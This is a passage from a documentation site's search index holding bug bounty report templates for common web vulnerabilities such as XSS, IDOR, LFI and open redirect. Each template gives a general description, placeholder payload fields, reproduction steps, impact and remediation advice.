attackers with information regarding versions, platform information, and source code that may help uncover vulnerabilities in the application or infrastructure.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/directory-traversal/#remediation","title":"Remediation","text":"<ul> <li>Configure your web server to prevent directory listings for all paths beneath the web root.</li> <li>Ensure sensitive information is removed from application directories and utilize access control lists to prevent access when necessary.</li> <li>Place into each directory a default file (such as index.htm) that the web server will display instead of returning a directory listing.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/directory-traversal/#references","title":"References","text":"<ul> <li>https://portswigger.net/kb/issues/00600100_directory-listing</li> <li>https://cwe.mitre.org/data/definitions/548.html</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/dom-xss-document-object-model-based-cross-site-scripting/","title":"DOM-XSS (Document Object Model-based cross-site scripting)","text":""},{"location":"Bug%20Bounty/Report%20Templates/dom-xss-document-object-model-based-cross-site-scripting/#dom-xss-document-object-model-based-cross-site-scripting","title":"DOM-XSS (Document Object Model-based cross-site scripting)","text":""},{"location":"Bug%20Bounty/Report%20Templates/dom-xss-document-object-model-based-cross-site-scripting/#vulnerability-name","title":"Vulnerability Name","text":"<p>DOM-XSS at [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/dom-xss-document-object-model-based-cross-site-scripting/#vulnerability-description","title":"Vulnerability Description","text":"<p>DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as <code>eval()</code> or <code>innerHTML</code>. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.</p> <p>The targeted page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/dom-xss-document-object-model-based-cross-site-scripting/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/dom-xss-document-object-model-based-cross-site-scripting/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Add the payload above in [Vulnerable Parameter] value.</li> <li>Reload the page.</li> <li>Observe as you should get an alert.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/dom-xss-document-object-model-based-cross-site-scripting/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/dom-xss-document-object-model-based-cross-site-scripting/#impact","title":"Impact","text":"<ul> <li>Gain access to users cookies, session IDs, passwords, private messages, etc.</li> <li>Read and access the content of a page for any attacked user and therefore all the information displayed to the user.</li> <li>Compromise the content shown to the user.</li> </ul> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/dom-xss-document-object-model-based-cross-site-scripting/#remediation","title":"Remediation","text":"<p>To keep yourself safe from XSS, you must sanitize your input. Your application code should never output data received as input directly to the browser without checking it for malicious code.</p> <ul> <li>Filter input on arrival.</li> <li>Encode data on output.</li> <li>Use appropriate response headers.</li> <li>Content Security Policy.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/dom-xss-document-object-model-based-cross-site-scripting/#reference","title":"Reference","text":"<ul> <li>https://portswigger.net/web-security/cross-site-scripting/dom-based</li> <li>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/github-recon/","title":"Github Recon","text":""},{"location":"Bug%20Bounty/Report%20Templates/github-recon/#github-recon","title":"Github Recon","text":""},{"location":"Bug%20Bounty/Report%20Templates/github-recon/#vulnerability-name","title":"Vulnerability Name","text":"<p>Sensitive information exposed on GitHub</p>"},{"location":"Bug%20Bounty/Report%20Templates/github-recon/#vulnerability-description","title":"Vulnerability Description","text":"<p>A public GitHub repository of an organization containing the source code of an internal application can inadvertently leak sensitive information when developers mistakenly include credentials, API keys, or configuration files with sensitive data, such as database passwords, in the codebase. </p> <p>If these secrets are not properly secured or if the repository is misconfigured, they become accessible to anyone, including potential attackers, who can exploit this information to gain unauthorized access to the organization's systems or data, potentially leading to data breaches, security vulnerabilities, or other detrimental consequences.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/github-recon/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Exposed Github Repository Link].</li> <li>Observe the sensitive data exposed.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/github-recon/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/github-recon/#impact","title":"Impact","text":"<p>Attackers, armed with exposed credentials and configuration data, can infiltrate the organization's systems, manipulate or steal data, disrupt services, or exploit vulnerabilities, potentially leading to legal and regulatory repercussions.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/github-recon/#remediation","title":"Remediation","text":"<ul> <li>Implement proper .gitignore files to exclude sensitive files, such as configuration files and secrets, from being committed to the repository.</li> <li>Avoid hardcoding secrets in code. Instead, use a secrets management tool or environment variables to securely store and retrieve credentials and API keys.</li> <li>Regularly scan your codebase with automated security analysis tools that can identify and flag potential vulnerabilities, including exposed secrets.</li> <li>Restrict access to the repository to only authorized personnel. Utilize GitHub's repository access controls and team permissions to limit who can view and modify the code.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/github-recon/#reference","title":"Reference","text":"<ul> <li>https://docs.github.com/en/code-security/getting-started/securing-your-repository</li> <li>https://docs.github.com/en/code-security/getting-started/best-practices-for-preventing-data-leaks-in-your-organization</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/host-header-injection/","title":"Host Header Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/host-header-injection/#host-header-injection","title":"Host Header Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/host-header-injection/#vulnerability-name","title":"Vulnerability Name","text":"<p>Host header Injection on [Parameter]</p>"},{"location":"Bug%20Bounty/Report%20Templates/host-header-injection/#vulnerability-description","title":"Vulnerability Description","text":"<p>HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as \"Host header injection\" attacks.</p> <p>In some cases, such as when the request has been forwarded by an intermediary system, the Host value may be altered before it reaches the intended back-end component.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/host-header-injection/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/host-header-injection/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Change the value of [Vulnerable Parameter] to the above payload and send the request.</li> <li>Observe as the payload executes in the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/host-header-injection/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/host-header-injection/#impact","title":"Impact","text":"<p>As the Host header is in fact user controllable, this practice can lead to a number of issues. If the input is not properly escaped or validated, the Host header is a potential vector for exploiting a range of other vulnerabilities, most notably:</p> <ul> <li>Web cache poisoning.</li> <li>Business logic flaws in specific functionality.</li> <li>Routing-based SSRF.</li> <li>Classic server-side vulnerabilities, such as SQL injection.</li> </ul> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/host-header-injection/#remediation","title":"Remediation","text":"<p>To prevent HTTP Host header attacks, the simplest approach is to avoid using the Host header altogether in server-side code. Double-check whether each URL really needs to be absolute. You will often find that you can just use a relative URL instead. This simple change can help you prevent web cache poisoning vulnerabilities in particular.</p> <p>Other ways to prevent HTTP Host header attacks include:</p> <ul> <li>Protect absolute URLs</li> <li>Validate the Host header</li> <li>Don't support Host override headers</li> <li>Whitelist permitted domains</li> <li>Be careful with internal-only virtual hosts</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/host-header-injection/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html</li> <li>https://portswigger.net/web-security/host-header#how-to-prevent-http-host-header-attacks</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/html-injection/","title":"HTML Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/html-injection/#html-injection","title":"HTML Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/html-injection/#vulnerability-name","title":"Vulnerability Name","text":"<p>HTML Injection on [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/html-injection/#vulnerability-description","title":"Vulnerability Description","text":"<p>HTML injection attack allows the injection of certain HTML tags into the web application. When an application does not properly handle user supplied data, an attacker can supply valid HTML code, typically via a parameter value, and inject their own content into the page.</p> <p>This attack is typically used in conjunction with some form of social engineering, as the attack is exploiting a code-based vulnerability and a user's trust.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/html-injection/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/html-injection/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Change the value of [Vulnerable Parameter] to the above payload and send the request.</li> <li>Observe as the payload executes in the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/html-injection/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/html-injection/#impact","title":"Impact","text":"<p>Malicious HTML can lead to the delivery of malware, infecting users' devices with viruses, ransomware, or other harmful software. Attackers may modify the appearance and content of a website, potentially damaging its reputation and integrity.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/html-injection/#remediation","title":"Remediation","text":"<ul> <li>Encoding should be applied directly before user-controllable data is written to a page, because the context you're writing into determines what kind of encoding you need to use.</li> <li>Validate input as strictly as possible at the point when it is first received from a user. Input validation should ideally work by blocking invalid input.</li> <li>Allowing users to post HTML markup should be avoided wherever possible, but sometimes it's a business requirement. The classic approach is to try to filter out potentially harmful tags and HTML. You can try to implement this using a whitelist of safe tags and attributes.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/html-injection/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html</li> <li>https://www.acunetix.com/vulnerabilities/web/html-injection/</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/idor-insecure-direct-object-references/","title":"IDOR (Insecure Direct Object References)","text":""},{"location":"Bug%20Bounty/Report%20Templates/idor-insecure-direct-object-references/#idor-insecure-direct-object-references","title":"IDOR (Insecure Direct Object References)","text":""},{"location":"Bug%20Bounty/Report%20Templates/idor-insecure-direct-object-references/#vulnerability-name","title":"Vulnerability Name","text":"<p>IDOR on [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/idor-insecure-direct-object-references/#vulnerability-description","title":"Vulnerability Description","text":"<p>Insecure Direct Object Reference (IDOR) is a vulnerability that arises when attackers can access or modify objects by manipulating identifiers used in a web application's URLs or parameters. It occurs due to missing access control checks, which fail to verify whether a user should be allowed to access specific data.</p> <p>IDOR vulnerabilities are most commonly associated with horizontal privilege escalation, but they can also arise in relation to vertical privilege escalation.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/idor-insecure-direct-object-references/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Login to the application.</li> <li>Go to [Affected URL] and alter [Vulnerable Parameter] value to something else.</li> <li>Observe as you should see the information of the another user through your account.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/idor-insecure-direct-object-references/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/idor-insecure-direct-object-references/#impact","title":"Impact","text":"<p>Attackers can bypass authorization and access resources in the system directly, for example database records or files. Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/idor-insecure-direct-object-references/#remediation","title":"Remediation","text":"<ul> <li>Never rely on obfuscation alone for access control.</li> <li>Unless a resource is intended to be publicly accessible, deny access by default.</li> <li>Wherever possible, use a single application-wide mechanism for enforcing access controls.</li> <li>At the code level, make it mandatory for developers to declare the access that is allowed for each resource, and deny access by default.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/idor-insecure-direct-object-references/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html</li> <li>https://portswigger.net/web-security/access-control#how-to-prevent-access-control-vulnerabilities</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/insecure-deserialization/","title":"Insecure Deserialization","text":""},{"location":"Bug%20Bounty/Report%20Templates/insecure-deserialization/#insecure-deserialization","title":"Insecure Deserialization","text":""},{"location":"Bug%20Bounty/Report%20Templates/insecure-deserialization/#vulnerability-name","title":"Vulnerability Name","text":"<p>Insecure deserialization at [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/insecure-deserialization/#vulnerability-description","title":"Vulnerability Description","text":"<p>Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.</p> <p>It is even possible to replace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an \"object injection\" vulnerability.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/insecure-deserialization/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Alter the value of [Vulnerable Parameter] and send the request.</li> <li>Observe the changes in the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/insecure-deserialization/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/insecure-deserialization/#impact","title":"Impact","text":"<p>This vulnerability can provides an entry point to a massively increased attack surface. It allows an attacker to reuse existing application code in harmful ways, resulting in numerous other vulnerabilities, often remote code execution.</p> <p>Even in cases where remote code execution is not possible, insecure deserialization can lead to privilege escalation, arbitrary file access, and denial-of-service attacks.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/insecure-deserialization/#remediation","title":"Remediation","text":"<ul> <li>Generally speaking, deserialization of user input should be avoided unless absolutely necessary. </li> <li>If you do need to deserialize data from untrusted sources, incorporate robust measures to make sure that the data has not been tampered with. </li> <li>If possible, you should avoid using generic deserialization features altogether. Serialized data from these methods contains all attributes of the original object, including private fields that potentially contain sensitive information. Instead, you could create your own class-specific serialization methods so that you can at least control which fields are exposed.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/insecure-deserialization/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</li> <li>https://portswigger.net/web-security/deserialization#how-to-prevent-insecure-deserialization-vulnerabilities</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/ldap-injection/","title":"LDAP Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/ldap-injection/#ldap-injection","title":"LDAP Injection","text":""},{"location":"Bug%20Bounty/Report%20Templates/ldap-injection/#vulnerability-name","title":"Vulnerability Name","text":"<p>LDAP Injection on [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/ldap-injection/#vulnerability-description","title":"Vulnerability Description","text":"<p>LDAP injection arises when user-controllable data is copied in an unsafe way into an LDAP query that is performed by the application. If an attacker can inject LDAP metacharacters into the query, then they can interfere with the query's logic. </p> <p>A web application could use LDAP in order to let users authenticate or search other users\u2019 information inside a corporate structure. The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which will be executed by the application.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ldap-injection/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/ldap-injection/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Change the value of [Vulnerable Parameter] to the above payload and send the request.</li> <li>Observe as the payload executes in the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/ldap-injection/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ldap-injection/#impact","title":"Impact","text":"<p>Depending on the function for which the query is used, the attacker may be able to retrieve sensitive data to which they are not authorized, or subvert the application's logic to perform some unauthorized action.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ldap-injection/#remediation","title":"Remediation","text":"<ul> <li>If possible, applications should avoid copying user-controllable data into LDAP queries. If this is unavoidable, then the data should be strictly validated to prevent LDAP injection attacks. </li> <li>In most situations, it will be appropriate to allow only short alphanumeric strings to be copied into queries, and any other input should be rejected. </li> <li>At a minimum, input containing any LDAP metacharacters should be rejected; characters that should be blocked include ( ) ; , * | &amp; = and whitespace.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/ldap-injection/#reference","title":"Reference","text":"<ul> <li>https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html</li> <li>https://cwe.mitre.org/data/definitions/90.html</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/lfi-local-file-inclusion/","title":"LFI (Local File Inclusion)","text":""},{"location":"Bug%20Bounty/Report%20Templates/lfi-local-file-inclusion/#lfi-local-file-inclusion","title":"LFI (Local File Inclusion)","text":""},{"location":"Bug%20Bounty/Report%20Templates/lfi-local-file-inclusion/#vulnerability-name","title":"Vulnerability Name","text":"<p>Local File Inclusion on [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/lfi-local-file-inclusion/#vulnerability-description","title":"Vulnerability Description","text":"<p>An attacker can use local file inclusion to trick the web application into exposing or running files on the web server. Typically, LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.</p> <p>This vulnerability allows an attacker to include a file, usually exploiting \u201cdynamic file inclusion\u201d mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/lfi-local-file-inclusion/#payload","title":"Payload","text":"<pre><code>Add your payload here\n</code></pre>"},{"location":"Bug%20Bounty/Report%20Templates/lfi-local-file-inclusion/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Change the value of [Vulnerable Parameter] to the above payload.</li> <li>Check the response, and you will see the content of the mentioned file.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/lfi-local-file-inclusion/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/lfi-local-file-inclusion/#impact","title":"Impact","text":"<p>This vulnerability can enable an attacker to read arbitrary files on the server that is running an application. This might include:</p> <ul> <li>Application code and data.</li> <li>Credentials for back-end systems.</li> <li>Sensitive operating system files.</li> </ul> <p>In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/lfi-local-file-inclusion/#remediation","title":"Remediation","text":"<ul> <li>Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters.</li> <li>After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.</li> <li>If you need to include local files in your website or web application code, use a whitelist of allowed file names and locations. Make sure that none of these files can be replaced by the attacker using file upload functions.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/lfi-local-file-inclusion/#reference","title":"Reference","text":"<ul> <li>https://portswigger.net/web-security/file-path-traversal#how-to-prevent-a-path-traversal-attack</li> <li>https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/open-redirect/","title":"Open Redirect","text":""},{"location":"Bug%20Bounty/Report%20Templates/open-redirect/#open-redirect","title":"Open Redirect","text":""},{"location":"Bug%20Bounty/Report%20Templates/open-redirect/#vulnerability-name","title":"Vulnerability Name","text":"<p>Open Redirect at [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/open-redirect/#vulnerability-description","title":"Vulnerability Description","text":"<p>Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. </p> <p>The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/open-redirect/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Go to [Affected URL].</li> <li>Change the value of [Vulnerable Parameter] to [example.com] and send the request.</li> <li>Observe as the page redirects to given URL above.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/open-redirect/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/open-redirect/#impact","title":"Impact","text":"<p>The user may be redirected to an untrusted page that contains malware which may then compromise the user's machine. This will expose the user to extensive risk and the user's interaction with the web server may also be compromised if the malware conducts keylogging or other attacks that steal credentials, personally identifiable information (PII), or other important data.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/open-redirect/#remediation","title":"Remediation","text":"<p>If possible, applications should avoid incorporating user-controllable data into redirection targets. In many cases, this behavior can be avoided in two ways:</p> <ul> <li>Remove the redirection function from the application, and replace links to it with direct links to the relevant target URLs.</li> <li>Maintain a server-side list of all URLs that are permitted for redirection. Instead of passing the target URL as a parameter to the redirector, pass an index into this list.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/open-redirect/#reference","title":"Reference","text":"<ul> <li>https://portswigger.net/kb/issues/00500100_open-redirection-reflected</li> <li>https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/race-condition/","title":"Race condition","text":""},{"location":"Bug%20Bounty/Report%20Templates/race-condition/#race-condition","title":"Race condition","text":""},{"location":"Bug%20Bounty/Report%20Templates/race-condition/#vulnerability-name","title":"Vulnerability Name","text":"<p>Race condition at [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/race-condition/#vulnerability-description","title":"Vulnerability Description","text":"<p>Race conditions are a common type of vulnerability closely related to business logic flaws. They occur when websites process requests concurrently without adequate safeguards. This can lead to multiple distinct threads interacting with the same data at the same time, resulting in a \"collision\" that causes unintended behavior in the application. </p> <p>A race condition attack uses carefully timed requests to cause intentional collisions and exploit this unintended behavior for malicious purposes. Like other logic flaws, the impact of a race condition is heavily dependent on the application and the specific functionality in which it occurs.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/race-condition/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Log in the application.</li> <li>Intercept the request in burp suite and send it to repeater.</li> <li>Alter the value of [Vulnerable Parameter] and send the request.</li> <li>Observe the response.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/race-condition/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/race-condition/#impact","title":"Impact","text":"<p>This vulnerability can grant attackers access to secured areas of an application. Once the attacker replaces the database update with their own set of data, they will be able to log in as an administrator. Other possibilities include manipulating API calls, tricking a central server into executing the same action multiple times despite it not being valid after the first time.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/race-condition/#remediation","title":"Remediation","text":"<ul> <li>Avoid mixing data from different storage places.</li> <li>Ensure sensitive endpoints make state changes atomic by using the datastore's concurrency features.</li> <li>As a defense-in-depth measure, take advantage of datastore integrity and consistency features like column uniqueness constraints.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/race-condition/#reference","title":"Reference","text":"<ul> <li>https://portswigger.net/web-security/race-conditions#how-to-prevent-race-condition-vulnerabilities</li> <li>https://cwe.mitre.org/data/definitions/362.html</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/response-manipulation/","title":"Response manipulation","text":""},{"location":"Bug%20Bounty/Report%20Templates/response-manipulation/#response-manipulation","title":"Response manipulation","text":""},{"location":"Bug%20Bounty/Report%20Templates/response-manipulation/#vulnerability-name","title":"Vulnerability Name","text":"<p>Response manipulation at [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/response-manipulation/#vulnerability-description","title":"Vulnerability Description","text":"<p>A client-side resource manipulation vulnerability is an input validation flaw. It occurs when an application accepts user-controlled input that specifies the path of a resource such as the source of an iframe, JavaScript, applet, or the handler of an XMLHttpRequest. </p> <p>This vulnerability consists of the ability to control the URLs that link to some resources present in a web page. The impact of this vulnerability varies, and it is usually adopted to conduct XSS attacks. This vulnerability makes it is possible to interfere with the expected application\u2019s behavior by causing it to load and render malicious objects.</p> <p>Add your specific vulnerability description if required, the one given above is a general description.</p>"},{"location":"Bug%20Bounty/Report%20Templates/response-manipulation/#steps-to-reproduce","title":"Steps to Reproduce","text":"<ol> <li>Log in the application.</li> <li>Intercept the request in burp suite.</li> <li>Select the option: Do Intercept -&gt; Response to this request.</li> <li>Alter the value of [Vulnerable Parameter] and send the request.</li> <li>Alter the value of [Vulnerable Parameter] and in the incoming response.</li> <li>Turn off the intercept and observe the change in application.</li> </ol>"},{"location":"Bug%20Bounty/Report%20Templates/response-manipulation/#poc","title":"POC","text":"<p>Modify the steps to reproduce above if required. Attach snapshots (POC) or a video link here.</p>"},{"location":"Bug%20Bounty/Report%20Templates/response-manipulation/#impact","title":"Impact","text":"<p>Attacker can interfere with the expected application\u2019s behavior by causing it to load and render malicious objects. It enables them to potentially deliver misleading, unauthorized, or malicious content to end-users.</p> <p>Add your specific impact if required, the one given above is a general impact.</p>"},{"location":"Bug%20Bounty/Report%20Templates/response-manipulation/#remediation","title":"Remediation","text":"<ul> <li>Do not use static response for validating authentication.</li> <li>Always place server-side validation on each request and validate users.</li> <li>Choose the appropriate token for the level of risk of the transaction.</li> <li>Where possible, implement multi-factor authentication to prevent automated, credential stuffing, brute force, and stolen credential re-use attacks.</li> </ul> <p>Add your specific remediation if required, the above is a general remediation.</p>"},{"location":"Bug%20Bounty/Report%20Templates/response-manipulation/#reference","title":"Reference","text":"<ul> <li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation</li> </ul>"},{"location":"Bug%20Bounty/Report%20Templates/rfi-remote-file-inclusion/","title":"RFI (Remote File Inclusion)","text":""},{"location":"Bug%20Bounty/Report%20Templates/rfi-remote-file-inclusion/#rfi-remote-file-inclusion","title":"RFI (Remote File Inclusion)","text":""},{"location":"Bug%20Bounty/Report%20Templates/rfi-remote-file-inclusion/#vulnerability-name","title":"Vulnerability Name","text":"<p>Remote File Inclusion on [Parameter] in [Module/Functionality]</p>"},{"location":"Bug%20Bounty/Report%20Templates/rfi-remote-file-inclusion/#vulnerability-description","title":"Vulnerability Description","text":"<p>Remote file inclusion attacks usually occur when an application receives a path to a file as input for a web page and does not properly sanitize it. This allows an external URL to be supplied to the include function.</p> <p>This 